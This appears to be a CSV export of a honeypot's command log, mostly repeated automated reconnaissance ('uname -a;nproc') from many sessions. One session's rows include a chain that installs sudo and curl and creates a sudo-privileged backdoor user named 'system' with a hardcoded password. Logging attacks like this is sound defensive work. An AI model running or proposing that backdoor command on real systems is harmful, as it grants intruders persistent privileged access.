"id","session","timestamp","realm","success","input"
"1293","4e0773a1d8d1","2023-12-25 08:49:48",NULL,"1","uname -a;nproc"
"1294","5523fbdc2ccd","2023-12-25 08:50:35",NULL,"1","uname -a;nproc"
"1295","57f31d64f279","2023-12-25 08:50:59",NULL,"1","uname -a;nproc"
"1296","a3a831662b49","2023-12-25 08:51:23",NULL,"1","uname -a;nproc"
"1297","693a93af24d2","2023-12-25 08:51:47",NULL,"1","uname -a;nproc"
"1298","b5669cba55d1","2023-12-25 08:52:12",NULL,"1","uname -a;nproc"
"1299","b30bfcc6e24f","2023-12-25 08:53:03",NULL,"1","uname -a;nproc"
"1300","5194919daee7","2023-12-25 08:53:29",NULL,"1","uname -a;nproc"
"1301","f6b99536d5a9","2023-12-25 08:53:54",NULL,"1","uname -a;nproc"
"1302","f0be5c92ecac","2023-12-25 08:54:18",NULL,"1","uname -a;nproc"
"1303","e0a08624cf9e","2023-12-25 08:54:42",NULL,"1","uname -a;nproc"
"1304","1fe8aff92e9c","2023-12-25 08:55:30",NULL,"1","uname -a;nproc"
"1305","4283e145a998","2023-12-25 08:55:54",NULL,"1","uname -a;nproc"
"1306","9dfb7b5d42e0","2023-12-25 08:56:17",NULL,"1","uname -a;nproc"
"1307","d40f83fb878e","2023-12-25 08:56:20",NULL,"1","uname -s -v -n -r -m"
"1308","c12d25373a41","2023-12-25 08:56:41",NULL,"1","uname -a;nproc"
"1309","768b75d0a600","2023-12-25 08:57:04",NULL,"1","uname -a;nproc"
"1310","df5da130d6a1","2023-12-25 08:57:29",NULL,"1","uname -a;nproc"
"1311","65a4465f3838","2023-12-25 08:57:54",NULL,"1","uname -a;nproc"
"1312","b609c70e5a12","2023-12-25 08:58:18",NULL,"1","uname -a;nproc"
"1313","13ab0b8d886b","2023-12-25 08:58:44",NULL,"1","uname -a;nproc"
"1314","aed835771634","2023-12-25 08:59:37",NULL,"1","uname -a;nproc"
"1315","af57b413eabd","2023-12-25 09:00:27",NULL,"1","uname -a;nproc"
"1316","e1b103ddb026","2023-12-25 09:00:51",NULL,"1","uname -a;nproc"
"1317","af6eb22b17d0","2023-12-25 09:01:14",NULL,"1","uname -a;nproc"
"1318","2be125c7f677","2023-12-25 09:01:38",NULL,"1","uname -a;nproc"
"1319","5145653418f0","2023-12-25 09:02:02",NULL,"1","uname -a;nproc"
"1320","4f95bc9708eb","2023-12-25 09:02:25",NULL,"1","uname -a;nproc"
"1321","64e3c8e80606","2023-12-25 09:02:49",NULL,"1","uname -a;nproc"
"1322","e2e832509edd","2023-12-25 09:02:58",NULL,"1","uname -s -v -n -r -m"
"1323","b381fd8b8d16","2023-12-25 09:03:13",NULL,"1","uname -a;nproc"
"1324","15c1f5bdda2e","2023-12-25 09:03:36",NULL,"1","uname -a;nproc"
"1325","e9dcbd655454","2023-12-25 09:04:00",NULL,"1","uname -a;nproc"
"1326","093b39195748","2023-12-25 09:04:25",NULL,"1","uname -a;nproc"
"1327","6bee6671c81c","2023-12-25 09:05:13",NULL,"1","uname -a;nproc"
"1328","cbd4c65f7a2e","2023-12-25 09:05:39",NULL,"1","uname -a;nproc"
"1329","a08fd3a712d4","2023-12-25 09:06:03",NULL,"1","uname -a;nproc"
"1330","2a8be66bf529","2023-12-25 09:06:29",NULL,"1","uname -a;nproc"
"1331","5e64d4319e62","2023-12-25 09:06:54",NULL,"1","uname -a;nproc"
"1332","5053bd59e0da","2023-12-25 09:07:20",NULL,"1","uname -a;nproc"
"1333","deb7277a88f4","2023-12-25 09:07:44",NULL,"1","uname -a;nproc"
"1334","c569eab33798","2023-12-25 09:08:09",NULL,"1","uname -a;nproc"
"1335","d2df2a7e1079","2023-12-25 09:08:32",NULL,"1","uname -a;nproc"
"1336","e153b6d382c4","2023-12-25 09:09:18",NULL,"1","uname -a;nproc"
"1337","4007dd461e4d","2023-12-25 09:09:37",NULL,"1","uname -s -v -n -r -m"
"1338","54bc4d101ae0","2023-12-25 09:09:41",NULL,"1","uname -a;nproc"
"1339","73f08b64f0c3","2023-12-25 09:10:04",NULL,"1","uname -a;nproc"
"1340","32f9843d1e43","2023-12-25 09:10:28",NULL,"1","uname -a;nproc"
"1341","2bec7a0db99b","2023-12-25 09:11:16",NULL,"1","uname -a;nproc"
"1342","4ada5b2d8dd8","2023-12-25 09:11:41",NULL,"1","uname -a;nproc"
"1343","cf97820b040e","2023-12-25 09:12:05",NULL,"1","uname -a;nproc"
"1344","63ffbdb53e80","2023-12-25 09:12:30",NULL,"1","uname -a;nproc"
"1345","58f933139256","2023-12-25 09:12:55",NULL,"1","uname -a;nproc"
"1346","ff902cb6bf7a","2023-12-25 09:13:20",NULL,"1","uname -a;nproc"
"1347","ee7ad4380ed0","2023-12-25 09:13:44",NULL,"1","uname -a;nproc"
"1348","5ab0289bece4","2023-12-25 09:14:09",NULL,"1","uname -a;nproc"
"1349","ae2a38f6a734","2023-12-25 09:14:58",NULL,"1","uname -a;nproc"
"1350","0c80d6fd5719","2023-12-25 09:15:45",NULL,"1","uname -a;nproc"
"1351","1aa034e0515d","2023-12-25 09:16:09",NULL,"1","uname -a;nproc"
"1352","59713d86be9a","2023-12-25 09:16:15",NULL,"1","uname -s -v -n -r -m"
"1353","f2f38bbb2c02","2023-12-25 09:16:33",NULL,"1","uname -a;nproc"
"1354","19feddf82236","2023-12-25 09:16:58",NULL,"1","uname -a;nproc"
"1355","1fbcb6a888f5","2023-12-25 09:17:23",NULL,"1","uname -a;nproc"
"1356","1f6d067139c1","2023-12-25 09:17:49",NULL,"1","uname -a;nproc"
"1357","6a977184721b","2023-12-25 09:18:15",NULL,"1","uname -a;nproc"
"1358","7cdc301daa2a","2023-12-25 09:18:41",NULL,"1","uname -a;nproc"
"1359","816cdfe2f45f","2023-12-25 09:19:07",NULL,"1","uname -a;nproc"
"1360","98e6672c8f4d","2023-12-25 09:19:33",NULL,"1","uname -a;nproc"
"1361","2eb0297b4943","2023-12-25 09:19:58",NULL,"1","uname -a;nproc"
"1362","4cb97af83d4b","2023-12-25 09:20:24",NULL,"1","uname -a;nproc"
"1363","a6a6a117c96a","2023-12-25 09:20:48",NULL,"1","uname -a;nproc"
"1364","e82b4f9dc466","2023-12-25 09:21:12",NULL,"1","uname -a;nproc"
"1365","0e9321a203ff","2023-12-25 09:21:58",NULL,"1","uname -a;nproc"
"1366","d9f249451e2a","2023-12-25 09:22:21",NULL,"1","uname -a;nproc"
"1367","261e1a8506c7","2023-12-25 09:22:53",NULL,"1","uname -s -v -n -r -m"
"1368","048725b88098","2023-12-25 09:23:32",NULL,"1","uname -a;nproc"
"1369","df65fbdf4a08","2023-12-25 09:23:55",NULL,"1","uname -a;nproc"
"1370","ba006e9ee605","2023-12-25 09:24:20",NULL,"1","uname -a;nproc"
"1371","8e85adabe307","2023-12-25 09:24:45",NULL,"1","uname -a;nproc"
"1372","b0e2523c9107","2023-12-25 09:25:09",NULL,"1","uname -a;nproc"
"1373","5b1c477e5dd7","2023-12-25 09:25:35",NULL,"1","uname -a;nproc"
"1374","41084e6ee316","2023-12-25 09:26:00",NULL,"1","uname -a;nproc"
"1375","e2122225b7c6","2023-12-25 09:26:24",NULL,"1","uname -a;nproc"
"1376","a426239e3382","2023-12-25 09:26:48",NULL,"1","uname -a;nproc"
"1377","e00f92cdcf01","2023-12-25 09:27:11",NULL,"1","uname -a;nproc"
"1378","03d0705f814b","2023-12-25 09:27:35",NULL,"1","uname -a;nproc"
"1379","2a867212fdaa","2023-12-25 09:27:58",NULL,"1","uname -a;nproc"
"1380","6514bae9e475","2023-12-25 09:28:22",NULL,"1","uname -a;nproc"
"1381","356aabaff49d","2023-12-25 09:28:46",NULL,"1","uname -a;nproc"
"1382","edbfaafac025","2023-12-25 09:29:10",NULL,"1","uname -a;nproc"
"1383","820da28458be","2023-12-25 09:29:33",NULL,"1","uname -s -v -n -r -m"
"1384","227531e4f93f","2023-12-25 09:29:34",NULL,"1","uname -a;nproc"
"1385","594640d45310","2023-12-25 09:29:58",NULL,"1","uname -a;nproc"
"1386","d315d730ff43","2023-12-25 09:30:23",NULL,"1","uname -a;nproc"
"1387","162b7fb57cce","2023-12-25 09:30:48",NULL,"1","uname -a;nproc"
"1388","106cfc4fc6f5","2023-12-25 09:31:38",NULL,"1","uname -a;nproc"
"1389","6e93e617378a","2023-12-25 09:32:29",NULL,"1","uname -a;nproc"
"1390","21072c8beba3","2023-12-25 09:33:18",NULL,"1","uname -a;nproc"
"1391","cf51629fadf9","2023-12-25 09:33:42",NULL,"1","uname -a;nproc"
"1392","c638070034dc","2023-12-25 09:34:06",NULL,"1","uname -a;nproc"
"1393","b5dd09b2a58a","2023-12-25 09:34:29",NULL,"1","uname -a;nproc"
"1394","0ddfe247d973","2023-12-25 09:34:52",NULL,"1","uname -a;nproc"
"1395","4990bd9f506d","2023-12-25 09:35:39",NULL,"1","uname -a;nproc"
"1396","a7e546567e37","2023-12-25 09:36:04",NULL,"1","uname -a;nproc"
"1397","c37086e44add","2023-12-25 09:36:13",NULL,"1","uname -s -v -n -r -m"
"1398","dbe946a57624","2023-12-25 09:36:28",NULL,"1","uname -a;nproc"
"1399","0455ba8d656e","2023-12-25 09:36:53",NULL,"1","uname -a;nproc"
"1400","3ecd930bcc7b","2023-12-25 09:37:18",NULL,"1","uname -a;nproc"
"1401","149243baec46","2023-12-25 09:37:43",NULL,"1","uname -a;nproc"
"1402","d2ae774e5426","2023-12-25 09:38:08",NULL,"1","uname -a;nproc"
"1403","144ff0643639","2023-12-25 09:38:57",NULL,"1","uname -a;nproc"
"1404","ae1b71b3170d","2023-12-25 09:39:22",NULL,"1","uname -a;nproc"
"1405","fdc531854e51","2023-12-25 09:39:46",NULL,"1","uname -a;nproc"
"1406","130b53772d13","2023-12-25 09:40:09",NULL,"1","uname -a;nproc"
"1407","eca695a3ccef","2023-12-25 09:40:33",NULL,"1","uname -a;nproc"
"1408","5c2356d5eb94","2023-12-25 09:41:19",NULL,"1","uname -a;nproc"
"1409","16fc2dc1c443","2023-12-25 09:41:43",NULL,"1","uname -a;nproc"
"1410","29897592070b","2023-12-25 09:42:07",NULL,"1","uname -a;nproc"
"1411","a419740a55e2","2023-12-25 09:42:52",NULL,"1","uname -s -v -n -r -m"
"1412","f7c109be0467","2023-12-25 09:42:55",NULL,"1","uname -a;nproc"
"1413","3a3b3d66eb09","2023-12-25 09:43:45",NULL,"1","uname -a;nproc"
"1414","e9311c3e1175","2023-12-25 09:44:09",NULL,"1","uname -a;nproc"
"1415","963a1d145cf1","2023-12-25 09:44:36",NULL,"1","uname -a;nproc"
"1416","5a96c847f963","2023-12-25 09:45:25",NULL,"1","uname -a;nproc"
"1417","6a26873cf821","2023-12-25 09:46:14",NULL,"1","uname -a;nproc"
"1418","7001141a9a21","2023-12-25 09:46:38",NULL,"1","uname -a;nproc"
"1419","06ab96c9945b","2023-12-25 09:47:02",NULL,"1","uname -a;nproc"
"1420","54bc08f476a8","2023-12-25 09:47:27",NULL,"1","uname -a;nproc"
"1421","1138281422ca","2023-12-25 09:48:15",NULL,"1","uname -a;nproc"
"1422","8d95b6f4e4c3","2023-12-25 09:48:38",NULL,"1","uname -a;nproc"
"1423","1547b1c3acdc","2023-12-25 09:49:03",NULL,"1","uname -a;nproc"
"1424","7834238f3586","2023-12-25 09:49:51",NULL,"1","uname -a;nproc"
"1425","8c50c5ac1b43","2023-12-25 09:50:17",NULL,"1","uname -a;nproc"
"1426","2d97cac57945","2023-12-25 09:50:42",NULL,"1","uname -a;nproc"
"1427","a2d94d43b3f5","2023-12-25 09:51:07",NULL,"1","uname -a;nproc"
"1428","524225fac1de","2023-12-25 09:51:32",NULL,"1","uname -a;nproc"
"1429","b9a3f41389ee","2023-12-25 09:51:57",NULL,"1","uname -a;nproc"
"1430","ebe0f03df55a","2023-12-25 09:52:20",NULL,"1","uname -a;nproc"
"1431","c8e0446af6e7","2023-12-25 09:52:44",NULL,"1","uname -a;nproc"
"1432","9e518762bc14","2023-12-25 09:53:07",NULL,"1","uname -a;nproc"
"1433","59e6e7a7e331","2023-12-25 09:53:31",NULL,"1","uname -a;nproc"
"1434","6662c352f760","2023-12-25 09:53:55",NULL,"1","uname -a;nproc"
"1435","e9f694fb6e57","2023-12-25 09:54:19",NULL,"1","uname -a;nproc"
"1436","0f76f89e08c9","2023-12-25 09:55:09",NULL,"1","uname -a;nproc"
"1437","ec28654a29df","2023-12-25 09:55:34",NULL,"1","uname -a;nproc"
"1438","c0c26b7b3d9c","2023-12-25 09:56:00",NULL,"1","uname -a;nproc"
"1439","c49ad628dfe3","2023-12-25 09:56:12",NULL,"1","uname -s -v -n -r -m"
"1440","cb196ac7815d","2023-12-25 09:56:26",NULL,"1","uname -a;nproc"
"1441","3298a451271f","2023-12-25 09:56:53",NULL,"1","uname -a;nproc"
"1442","40cca6aaeddb","2023-12-25 09:57:19",NULL,"1","uname -a;nproc"
"1443","37b8f446c74e","2023-12-25 09:57:44",NULL,"1","uname -a;nproc"
"1444","ab4b727ad382","2023-12-25 09:58:10",NULL,"1","uname -a;nproc"
"1445","9066e119a6fb","2023-12-25 09:58:34",NULL,"1","uname -a;nproc"
"1446","952864b59472","2023-12-25 09:58:58",NULL,"1","uname -a;nproc"
"1447","bb4649d2b220","2023-12-25 09:59:22",NULL,"1","uname -a;nproc"
"1448","9b78f88d81e4","2023-12-25 09:59:45",NULL,"1","uname -a;nproc"
"1449","7d864ce7052a","2023-12-25 10:00:08",NULL,"1","uname -a;nproc"
"1450","3cc5834de474","2023-12-25 10:00:31",NULL,"1","uname -a;nproc"
"1451","0f914b67a04d","2023-12-25 10:01:19",NULL,"1","uname -a;nproc"
"1452","92bc61835354","2023-12-25 10:01:44",NULL,"1","uname -a;nproc"
"1453","610397380015","2023-12-25 10:02:09",NULL,"1","uname -a;nproc"
"1454","d06ba1c5d4db","2023-12-25 10:02:34",NULL,"1","uname -a;nproc"
"1455","9f92753bce9c","2023-12-25 10:02:51",NULL,"1","uname -s -v -n -r -m"
"1456","8c7c9dc850f1","2023-12-25 10:03:01",NULL,"1","uname -a;nproc"
"1457","db85c641d25e","2023-12-25 10:03:28",NULL,"1","uname -a;nproc"
"1458","a05bd1e6cb36","2023-12-25 10:03:54",NULL,"1","uname -a;nproc"
"1459","6436dc6a2fb5","2023-12-25 10:04:21",NULL,"1","uname -a;nproc"
"1460","c07725ad6e39","2023-12-25 10:04:48",NULL,"1","uname -a;nproc"
"1461","fac6b80a6b73","2023-12-25 10:05:12",NULL,"1","uname -a;nproc"
"1462","59574a177d96","2023-12-25 10:05:37",NULL,"1","uname -a;nproc"
"1463","678e0a2d7bda","2023-12-25 10:06:00",NULL,"1","uname -a;nproc"
"1464","46d6cc481123","2023-12-25 10:06:24",NULL,"1","uname -a;nproc"
"1465","3e792b7efa6c","2023-12-25 10:07:12",NULL,"1","uname -a;nproc"
"1466","9b8dd5b2350c","2023-12-25 10:07:59",NULL,"1","uname -a;nproc"
"1467","104572c53bb3","2023-12-25 10:08:25",NULL,"1","uname -a;nproc"
"1468","c4d8496819c1","2023-12-25 10:08:49",NULL,"1","uname -a;nproc"
"1469","0f7fdbd62c0e","2023-12-25 10:09:14",NULL,"1","uname -a;nproc"
"1470","cdea14da43ec","2023-12-25 10:09:31",NULL,"1","uname -s -v -n -r -m"
"1471","2ef9af347d07","2023-12-25 10:09:39",NULL,"1","uname -a;nproc"
"1472","2286af786b78","2023-12-25 10:10:31",NULL,"1","uname -a;nproc"
"1473","bb06fdc659c0","2023-12-25 10:10:55",NULL,"1","uname -a;nproc"
"1474","b9e5168b32ac","2023-12-25 10:11:19",NULL,"1","uname -a;nproc"
"1475","5dd7f3508531","2023-12-25 10:12:08",NULL,"1","uname -a;nproc"
"1476","4532c8849e1a","2023-12-25 10:12:32",NULL,"1","uname -a;nproc"
"1477","47c68763657f","2023-12-25 10:12:55",NULL,"1","uname -a;nproc"
"1478","310a2c906196","2023-12-25 10:13:19",NULL,"1","uname -a;nproc"
"1479","db037dc2a4b9","2023-12-25 10:13:42",NULL,"1","uname -a;nproc"
"1480","7f663530374a","2023-12-25 10:14:06",NULL,"1","uname -a;nproc"
"1481","e766a8754186","2023-12-25 10:14:30",NULL,"1","uname -a;nproc"
"1482","2ba484db9135","2023-12-25 10:15:18",NULL,"1","uname -a;nproc"
"1483","4b97784930e9","2023-12-25 10:15:43",NULL,"1","uname -a;nproc"
"1484","31246a4c6872","2023-12-25 10:16:07",NULL,"1","uname -a;nproc"
"1485","882f26cc641e","2023-12-25 10:16:10",NULL,"1","uname -s -v -n -r -m"
"1486","f48903ad7546","2023-12-25 10:16:33",NULL,"1","uname -a;nproc"
"1487","90235aae474b","2023-12-25 10:16:57",NULL,"1","uname -a;nproc"
"1488","c2a89d0c1265","2023-12-25 10:17:24",NULL,"1","uname -a;nproc"
"1489","e729c04b8a7e","2023-12-25 10:17:50",NULL,"1","uname -a;nproc"
"1490","71c0646ee902","2023-12-25 10:18:14",NULL,"1","uname -a;nproc"
"1491","b070a6cc8daa","2023-12-25 10:19:26",NULL,"1","uname -a;nproc"
"1492","ae6d0688556c","2023-12-25 10:19:49",NULL,"1","uname -a;nproc"
"1493","8f1dff5fa532","2023-12-25 10:21:03",NULL,"1","uname -a;nproc"
"1494","00beff095adb","2023-12-25 10:21:29",NULL,"1","uname -a;nproc"
"1495","957457fc8519","2023-12-25 10:22:19",NULL,"1","uname -a;nproc"
"1496","a0c4b66c6ef2","2023-12-25 10:22:45",NULL,"1","uname -a;nproc"
"1497","29d8ad3dd433","2023-12-25 10:22:49",NULL,"1","uname -s -v -n -r -m"
"1498","3beefde85d8e","2023-12-25 10:23:10",NULL,"1","uname -a;nproc"
"1499","aefe3af5002f","2023-12-25 10:24:24",NULL,"1","uname -a;nproc"
"1500","960a99841abf","2023-12-25 10:24:47",NULL,"1","uname -a;nproc"
"1501","a707d2f33692","2023-12-25 10:25:12",NULL,"1","uname -a;nproc"
"1502","27f66a2b0592","2023-12-25 10:25:35",NULL,"1","uname -a;nproc"
"1503","687e5f1da5f8","2023-12-25 10:25:57",NULL,"1","uname -a;nproc"
"1504","2c58247f8d15","2023-12-25 10:26:21",NULL,"1","uname -a;nproc"
"1505","2c9a6df717e2","2023-12-25 10:26:45",NULL,"1","uname -a;nproc"
"1506","4d7931ed0775","2023-12-25 10:27:08",NULL,"1","uname -a;nproc"
"1507","0749262f0f2d","2023-12-25 10:27:57",NULL,"1","uname -a;nproc"
"1508","20ccad40e747","2023-12-25 10:28:22",NULL,"1","uname -a;nproc"
"1509","5cd7b38b2d0f","2023-12-25 10:28:48",NULL,"1","uname -a;nproc"
"1510","0025b5d6d934","2023-12-25 10:29:29",NULL,"1","uname -s -v -n -r -m"
"1511","4616e76a0bad","2023-12-25 10:29:37",NULL,"1","uname -a;nproc"
"1512","644c6a938894","2023-12-25 10:30:02",NULL,"1","uname -a;nproc"
"1513","1547d959133a","2023-12-25 10:30:25",NULL,"1","uname -a;nproc"
"1514","e418faf36e97","2023-12-25 10:30:50",NULL,"1","uname -a;nproc"
"1515","6af9942d680e","2023-12-25 10:31:59",NULL,"1","uname -a;nproc"
"1516","48d4fcd28ac0","2023-12-25 10:32:21",NULL,"1","uname -a;nproc"
"1517","2c8a7b62d4dc","2023-12-25 10:32:45",NULL,"1","uname -a;nproc"
"1518","bb09d68a827f","2023-12-25 10:33:10",NULL,"1","uname -a;nproc"
"1519","19fbad54caca","2023-12-25 10:33:34",NULL,"1","uname -a;nproc"
"1520","93f11bfcad20","2023-12-25 10:33:59",NULL,"1","uname -a;nproc"
"1521","9ab7dff26de6","2023-12-25 10:34:24",NULL,"1","uname -a;nproc"
"1522","b5b87e407a1a","2023-12-25 10:35:16",NULL,"1","uname -a;nproc"
"1523","2670753242e7","2023-12-25 10:35:41",NULL,"1","uname -a;nproc"
"1524","916121a04859","2023-12-25 10:36:06",NULL,"1","uname -a;nproc"
"1525","b815e1f735b9","2023-12-25 10:36:09",NULL,"1","uname -s -v -n -r -m"
"1526","bc869829dfd3","2023-12-25 10:36:31",NULL,"1","uname -a;nproc"
"1527","2971d9d18568","2023-12-25 10:36:55",NULL,"1","uname -a;nproc"
"1528","4b78e0001718","2023-12-25 10:37:44",NULL,"1","uname -a;nproc"
"1529","7f16b1bbeec2","2023-12-25 10:38:07",NULL,"1","uname -a;nproc"
"1530","afcce4eea4fe","2023-12-25 10:38:31",NULL,"1","uname -a;nproc"
"1531","fdcb9950e0b3","2023-12-25 10:39:42",NULL,"1","uname -a;nproc"
"1532","eb4725217db7","2023-12-25 10:40:29",NULL,"1","uname -a;nproc"
"1533","4d4b5f9c08f7","2023-12-25 10:40:55",NULL,"1","uname -a;nproc"
"1534","67be5ab04083","2023-12-25 10:41:20",NULL,"1","uname -a;nproc"
"1535","0f4cc104cb21","2023-12-25 10:41:45",NULL,"1","uname -a;nproc"
"1536","a21802461789","2023-12-25 10:42:10",NULL,"1","uname -a;nproc"
"1537","53ca1f725418","2023-12-25 10:42:35",NULL,"1","uname -a;nproc"
"1538","ce7af1761b8c","2023-12-25 10:42:46",NULL,"1","uname -s -v -n -r -m"
"1539","29a93ce881da","2023-12-25 10:42:58",NULL,"1","uname -a;nproc"
"1540","d89418191631","2023-12-25 10:43:21",NULL,"1","uname -a;nproc"
"1541","d53f2841d9e3","2023-12-25 10:43:45",NULL,"1","uname -a;nproc"
"1542","c35ffbf49bbd","2023-12-25 10:44:08",NULL,"1","uname -a;nproc"
"1543","057e6387fb69","2023-12-25 10:44:31",NULL,"1","uname -a;nproc"
"1544","8ef1ccb852e7","2023-12-25 10:44:54",NULL,"1","uname -a;nproc"
"1545","b5ac4200db51","2023-12-25 10:45:18",NULL,"1","uname -a;nproc"
"1546","bd03eb80421a","2023-12-25 10:45:42",NULL,"1","uname -a;nproc"
"1547","59eadd60fa29","2023-12-25 10:46:08",NULL,"1","uname -a;nproc"
"1548","e1bcf2c56205","2023-12-25 10:46:34",NULL,"1","uname -a;nproc"
"1549","9eb550b0d9ad","2023-12-25 10:47:01",NULL,"1","uname -a;nproc"
"1550","92f07f080d0d","2023-12-25 10:47:43",NULL,"1","uname -s -v -n -r -m"
"1551","44d912722203","2023-12-25 10:47:55",NULL,"1","uname -a;nproc"
"1552","8a99f192ad2d","2023-12-25 10:49:13",NULL,"1","uname -a;nproc"
"1553","a7b47b9a7369","2023-12-25 10:49:22",NULL,"1","uname -s -v -n -r -m"
"1554","ba91c59b6e09","2023-12-25 10:50:02",NULL,"1","uname -a;nproc"
"1555","afa80642040f","2023-12-25 10:50:26",NULL,"1","uname -a;nproc"
"1556","043b57ecad56","2023-12-25 10:50:50",NULL,"1","uname -a;nproc"
"1557","30fd0862082d","2023-12-25 10:51:13",NULL,"1","uname -a;nproc"
"1558","16a66ce277e5","2023-12-25 10:51:36",NULL,"1","uname -a;nproc"
"1559","8ac5c57d8dc1","2023-12-25 10:52:00",NULL,"1","uname -a;nproc"
"1560","7c5941af50b3","2023-12-25 10:52:24",NULL,"1","uname -a;nproc"
"1561","cd7b22fca416","2023-12-25 10:52:49",NULL,"1","uname -a;nproc"
"1562","35bf633906ce","2023-12-25 10:53:14",NULL,"1","uname -a;nproc"
"1563","8e5c71b2bde4","2023-12-25 10:53:39",NULL,"1","uname -a;nproc"
"1564","38a747fa7a0b","2023-12-25 10:54:05",NULL,"1","uname -a;nproc"
"1565","d02885871d36","2023-12-25 10:54:27",NULL,"1","uname -s -v -n -r -m"
"1566","a6e613dbb135","2023-12-25 10:54:30",NULL,"1","uname -a;nproc"
"1567","36193560bf7e","2023-12-25 10:54:56",NULL,"1","uname -a;nproc"
"1568","16894782463c","2023-12-25 10:55:21",NULL,"1","uname -a;nproc"
"1569","c8ec9a67977b","2023-12-25 10:55:47",NULL,"1","uname -a;nproc"
"1570","cb1d5146bfd4","2023-12-25 10:55:59",NULL,"1","uname -s -v -n -r -m"
"1571","b7d613036577","2023-12-25 10:56:12",NULL,"1","uname -a;nproc"
"1572","cd0287f8a279","2023-12-25 10:56:37",NULL,"1","uname -a;nproc"
"1573","46a25161c651","2023-12-25 10:57:01",NULL,"1","uname -a;nproc"
"1574","dd931dc5ee7e","2023-12-25 10:57:25",NULL,"1","uname -a;nproc"
"1575","667516eec5dd","2023-12-25 10:57:49",NULL,"1","uname -a;nproc"
"1576","8cb0b218ceed","2023-12-25 10:58:13",NULL,"1","uname -a;nproc"
"1577","1bad3cab7703","2023-12-25 10:59:02",NULL,"1","uname -a;nproc"
"1578","ec28f93290e4","2023-12-25 10:59:27",NULL,"1","uname -a;nproc"
"1579","41f04b4d470d","2023-12-25 10:59:52",NULL,"1","uname -a;nproc"
"1580","06b375c60e8a","2023-12-25 11:00:43",NULL,"1","uname -a;nproc"
"1581","9f217a581386","2023-12-25 11:01:08",NULL,"1","uname -a;nproc"
"1582","e009b943f7a8","2023-12-25 11:01:11",NULL,"1","uname -s -v -n -r -m"
"1583","2c98d58835ac","2023-12-25 11:01:34",NULL,"1","uname -a;nproc"
"1584","07d01619e470","2023-12-25 11:01:58",NULL,"1","uname -a;nproc"
"1585","dd4e83ecb12e","2023-12-25 11:02:22",NULL,"1","uname -a;nproc"
"1586","41ab23222ce5","2023-12-25 11:02:37",NULL,"1","uname -s -v -n -r -m"
"1587","5f2c393d0382","2023-12-25 11:02:46",NULL,"1","uname -a;nproc"
"1588","c8dc7da9997a","2023-12-25 11:03:10",NULL,"1","uname -a;nproc"
"1589","aa271b64fd47","2023-12-25 11:03:33",NULL,"1","uname -a;nproc"
"1590","7d153bf66893","2023-12-25 11:03:57",NULL,"1","uname -a;nproc"
"1591","00632e06e7ad","2023-12-25 11:04:21",NULL,"1","uname -a;nproc"
"1592","fb379b0ac8e7","2023-12-25 11:04:45",NULL,"1","uname -a;nproc"
"1593","1ff61427fd93","2023-12-25 11:05:07",NULL,"1","apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 7TnvtJuF) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system"
"1594","1ff61427fd93","2023-12-25 11:05:07",NULL,"1","openssl passwd -1 7TnvtJuF"
"1595","1ff61427fd93","2023-12-25 11:05:07",NULL,"0","openssl passwd -1 7TnvtJuF"
"1596","1ff61427fd93","2023-12-25 11:05:07",NULL,"0","apt update"
"1597","1ff61427fd93","2023-12-25 11:05:07",NULL,"0","apt install sudo curl -y"
"1598","e741f755f0ee","2023-12-25 11:05:10",NULL,"1","uname -a;nproc"
"1599","c175ae038d69","2023-12-25 11:05:59",NULL,"1","uname -a;nproc"
"1600","4a02ff25c6ff","2023-12-25 11:06:25",NULL,"1","uname -a;nproc"
"1601","243ae8b62373","2023-12-25 11:06:50",NULL,"1","uname -a;nproc"
"1602","93d05aeeafca","2023-12-25 11:07:16",NULL,"1","uname -a;nproc"
"1603","6c99aeaf4d7e","2023-12-25 11:07:41",NULL,"1","uname -a;nproc"
"1604","4b3a6b3c3438","2023-12-25 11:07:54",NULL,"1","uname -s -v -n -r -m"
"1605","d94bb34bbdc1","2023-12-25 11:08:06",NULL,"1","uname -a;nproc"
"1606","e240ec5d7798","2023-12-25 11:08:31",NULL,"1","uname -a;nproc"
"1607","c3bb5116d93c","2023-12-25 11:08:55",NULL,"1","uname -a;nproc"
"1608","32da1c56bee2","2023-12-25 11:09:15",NULL,"1","uname -s -v -n -r -m"
"1609","fe7f5a37c976","2023-12-25 11:10:06",NULL,"1","uname -a;nproc"
"1610","4cd4325ebd71","2023-12-25 11:10:30",NULL,"1","uname -a;nproc"
"1611","4e5e5eff4de0","2023-12-25 11:10:53",NULL,"1","uname -a;nproc"
"1612","c30cb739fee0","2023-12-25 11:11:17",NULL,"1","uname -a;nproc"
"1613","6212a6979580","2023-12-25 11:11:41",NULL,"1","uname -a;nproc"
